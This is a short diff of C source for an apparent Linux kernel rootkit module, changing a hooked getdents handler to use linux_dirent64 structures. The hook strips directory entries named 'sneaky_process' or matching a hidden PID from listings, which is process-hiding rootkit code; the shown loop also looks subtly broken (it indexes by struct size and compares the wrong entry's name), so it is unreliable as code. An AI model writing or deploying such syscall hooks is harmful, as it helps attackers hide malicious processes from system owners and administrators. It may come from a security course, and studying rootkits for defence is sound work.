@@ -57,9 +57,9 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 // int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 // DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
-    struct linux_dirent *d;
+    struct linux_dirent64 *d;
     int nread = original_getdents(regs);
-    struct linux_dirent * dirp = (struct linux_dirent *)regs->si;
+    struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
     int bpos;
 
     if (nread == -1) {
@@ -70,7 +70,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     }
 
     for (bpos = 0; bpos < nread;) {
-        d = (struct linux_dirent *) (dirp + bpos);
+        d = (struct linux_dirent64 *) (dirp + bpos);
         if (strcmp(dirp->d_name, "sneaky_process") == 0 || strcmp(dirp->d_name, sneaky_pid) == 0) {
             memmove((void *)(dirp + bpos), (void *)(dirp + bpos + d->d_reclen), nread - d->d_reclen - bpos);
             nread -= d->d_reclen;
